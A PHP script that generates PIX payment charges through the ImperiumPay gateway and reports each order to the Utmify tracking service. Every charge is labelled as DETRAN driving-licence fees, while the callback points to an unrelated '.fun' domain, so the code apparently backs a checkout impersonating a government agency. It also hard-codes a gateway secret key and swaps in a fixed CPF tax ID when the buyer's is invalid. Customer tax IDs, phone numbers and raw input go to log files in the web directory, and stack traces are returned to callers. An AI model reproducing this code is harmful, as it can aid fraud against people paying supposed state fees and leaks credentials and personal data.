<?php

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

define('IMPERIUM_API_URL', 'https://dashboard.imperiumpay.app/api/v1');
define('IMPERIUM_PUBLIC_KEY', 'thiago-ziko83_jne00aabb0ayv6g3');
define('IMPERIUM_SECRET_KEY', 'qni75spjlhdemqzyshsoer8xbqvwfblea5eflzf5ce7xxio21py86pec8z6nbl6i');

define('ACCOUNT_ID', 4084);
define('PROVIDER_NAME', 'Minha Loja');

define('PRODUCT_HASH', 'prod_a181b2646bf55a8a');

define('UTMIFY_API_URL', 'https://api.utmify.com.br/api-credentials/orders');
define('UTMIFY_API_TOKEN', '');
define('UTMIFY_PLATFORM_NAME', 'ParadiseIntegration');


function enviarPixGeradoUtmify($transactionId, $amount, $customerData, $utmParams) {
    try {
        $document = preg_replace('/[^0-9]/', '', $customerData['document'] ?? '');
        $phone = preg_replace('/[^0-9]/', '', $customerData['phone'] ?? '');

        if (!str_starts_with($phone, '55')) {
            $phone = '55' . $phone;
        }

        $totalInCents = (int)$amount;
        $gatewayFee = (int)($totalInCents * 0.03);
        $userCommission = $totalInCents - $gatewayFee;

        $payload = [
            'orderId' => $transactionId,
            'platform' => UTMIFY_PLATFORM_NAME,
            'paymentMethod' => 'pix',
            'status' => 'waiting_payment',
            'createdAt' => gmdate('Y-m-d H:i:s'),
            'approvedDate' => null,
            'refundedAt' => null,
            'customer' => [
                'name' => $customerData['name'] ?? 'Cliente',
                'email' => $customerData['email'] ?? 'email@exemplo.com',
                'phone' => $phone,
                'document' => $document,
                'country' => 'BR',
                'ip' => $_SERVER['REMOTE_ADDR'] ?? null
            ],
            'products' => [
                [
                    'id' => 'product_' . $transactionId,
                    'name' => 'Pagamento DETRAN - Taxas CNH',
                    'quantity' => 1,
                    'priceInCents' => $totalInCents
                ]
            ],
            'trackingParameters' => $utmParams,
            'commission' => [
                'totalPriceInCents' => $totalInCents,
                'gatewayFeeInCents' => $gatewayFee,
                'userCommissionInCents' => $userCommission
            ],
            'isTest' => false
        ];

        $ch = curl_init(UTMIFY_API_URL);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                'x-api-token: ' . UTMIFY_API_TOKEN
            ],
            CURLOPT_POSTFIELDS => json_encode($payload),
            CURLOPT_TIMEOUT => 30
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        file_put_contents('utmify_log.log', date('Y-m-d H:i:s') . " - Utmify PIX (HTTP $httpCode): $response\n", FILE_APPEND);

        return ['success' => ($httpCode >= 200 && $httpCode < 300)];

    } catch (Exception $e) {
        file_put_contents('utmify_log.log', date('Y-m-d H:i:s') . " - Erro Utmify: " . $e->getMessage() . "\n", FILE_APPEND);
        return ['success' => false];
    }
}


function gerarPagamentoPix($payload) {
    try {

        $amount = (float)$payload['amount'];
        $customerName = $payload['customer_name'] ?? 'Cliente';
        $customerEmail = $payload['customer_email'] ?? 'email@exemplo.com';
        $customerCpf = preg_replace('/[^0-9]/', '', $payload['customer_cpf'] ?? '');
        $customerPhone = preg_replace('/[^0-9]/', '', $payload['customer_phone'] ?? '11999999999');

        if (strlen($customerPhone) < 10) {
            $customerPhone = '11999999999';
        }

        if (!str_starts_with($customerPhone, '55')) {
            $customerPhone = '55' . $customerPhone;
        }

        if (strlen($customerCpf) !== 11) {
            $customerCpf = '05531510101';
        }

        $amountInCents = (int)round($amount * 100);
        $amountNumber = round($amountInCents / 100, 2);


        $reference = 'REF-' . time() . '-' . substr(md5(uniqid()), 0, 8);
        $utmParams = $payload['utmParams'] ?? [];

        $imperiumPayload = [
             'identifier' => $reference,
            'amount' => $amountNumber,
            'shippingFee' => 0,
            'extraFee' => 0,
            'discount' => 0,

            'client' => [
                'name' => $customerName,
                'email' => $customerEmail,
                'phone' => '+' . $customerPhone,
                'document' => $customerCpf
            ],

            'products' => [
                [
                    'id' => 'prod_' . $reference,
                    'name' => 'Pagamento DETRAN - Taxas CNH',
                    'quantity' => 1,
                    'price' => $amountNumber,
                    'physical' => false
                ]
            ],

            'metadata' => [
                'provider' => 'Checkout',
                'orderId' => $reference
            ],

            'callbackUrl' => 'https://vagaconectada.fun/api/webhook'
        ];

        file_put_contents('debug_pix.log', date('Y-m-d H:i:s') . " - Payload Imperium: " . json_encode($imperiumPayload) . "\n", FILE_APPEND);

        $ch = curl_init(IMPERIUM_API_URL . '/gateway/pix/receive');
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                'x-public-key: ' . IMPERIUM_PUBLIC_KEY,
                'x-secret-key: ' . IMPERIUM_SECRET_KEY
            ],
            CURLOPT_POSTFIELDS => json_encode($imperiumPayload),
            CURLOPT_TIMEOUT => 30
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        $result = json_decode($response, true);

        file_put_contents('debug_pix.log', "Imperium HTTP $httpCode\n$response\n", FILE_APPEND);

        if ($httpCode === 201 && isset($result['transactionId'], $result['pix']['code'])) {

            enviarPixGeradoUtmify($result['transactionId'], $amountInCents, $imperiumPayload['client'], $utmParams);

            return [
                'success' => true,
                'data' => [
                    'id' => $result['transactionId'],
                    'qr_code' => $result['pix']['code'],
                    'qr_base64' => $result['pix']['base64'] ?? null,
                    'qr_image' => $result['pix']['image'] ?? null,
                    'status' => $result['status'] ?? 'pending'
                ]
            ];
        }

        if (
            isset($result['transactionId']) &&
            isset($result['pix']['code'])
        ) {
            return [
                'success' => true,
                'data' => [
                    'id' => $result['transactionId'],
                    'qr_code' => $result['pix']['code'],
                    'qr_base64' => $result['pix']['base64'] ?? null,
                    'qr_image' => $result['pix']['image'] ?? null,
                    'status' => $result['status'] ?? 'PENDING'
                ]
            ];
        }

throw new Exception(
    'ImperiumPay erro: ' . ($result['message'] ?? json_encode($result, JSON_UNESCAPED_UNICODE))
);


    } catch (Exception $e) {
        return [
            'success' => false,
            'error' => $e->getMessage(),
            'trace' => $e->getTraceAsString()
        ];
    }
}


// ===== EXECUÇÃO =====

file_put_contents('debug_pix.log', date('Y-m-d H:i:s') . " - Início\n", FILE_APPEND);

$rawInput = file_get_contents('php://input');
file_put_contents('debug_pix.log', "Raw: $rawInput\n", FILE_APPEND);

$input = json_decode($rawInput, true) ?: $_POST;

if (empty($input['amount'])) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Amount é obrigatório']);
    exit;
}

$resultado = gerarPagamentoPix($input);

file_put_contents('debug_pix.log', "Resultado: " . json_encode($resultado) . "\n\n", FILE_APPEND);

http_response_code($resultado['success'] ? 200 : 400);
echo json_encode($resultado, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
exit;
